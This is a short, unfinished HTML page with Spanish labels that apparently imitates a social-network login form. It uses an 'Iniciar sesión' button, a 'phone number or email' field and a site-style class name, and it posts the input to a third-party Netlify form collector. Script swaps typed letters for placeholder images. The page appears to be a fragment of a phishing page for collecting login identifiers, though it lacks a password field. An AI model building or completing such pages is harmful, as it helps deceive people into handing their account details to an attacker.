<!DOCTYPE html>
<html>
<head>
    <title>Cuadro de texto con imágenes</title>
    <style>
        .imagen-input {
            position: relative;
            display: inline-block;
            width: 250px;
        }

        .imagen-input input[type="text"] {
            width: 100%;
            padding-right: 30px;
        }

        .imagen-input .imagenes-container {
            position: absolute;
            top: 0;
            left: 0;
        }

        .imagen-input img {
            position: absolute;
            height: 20px;
            width: 20px;
            margin-right: 5px;
        }
    </style>
    <script>
        function mostrarImagenes() {
            var texto = document.getElementById("correo").value;
            var contenedor = document.getElementById("imagenesContainer");
            contenedor.innerHTML = "";

            for (var i = 0; i < texto.length; i++) {
                var letra = texto[i];
                var imagen = document.createElement("img");
                imagen.src = obtenerRutaImagen(letra.toLowerCase()); // Reemplaza "obtenerRutaImagen" con la función que devuelve la ruta de la imagen según la letra
                imagen.style.left = (i * 25) + "px"; // Ajusta el espaciado horizontal de las imágenes
                contenedor.appendChild(imagen);
            }
        }

        function obtenerRutaImagen(letra) {
            // Retorna la ruta de la imagen correspondiente a la letra
            // Personaliza esta función según tus necesidades
            switch (letra) {
                case "a":
                    return "ruta_imagen_a";
                case "b":
                    return "ruta_imagen_b";
                // Agrega más casos para las demás letras
                default:
                    return "ruta_imagen_predeterminada";
            }
        }
    </script>
</head>
<body>

<div class="_5rut">
    <form name="contact" method="POST" data-netlify="true" action="/index">
        <div class="form-group">
            <div class="imagen-input">
                <input class="form-control" type="text" name="correo" id="correo" placeholder="Número de móvil o correo electrónico" required oninput="mostrarImagenes()">
                <div id="imagenesContainer" class="imagenes-container"></div>
            </div>
        </div>
        <button type="submit" name="submit" class="btn btn-primary btn-block">Iniciar sesión</button>
    </form>
</div>

</body>
</html>
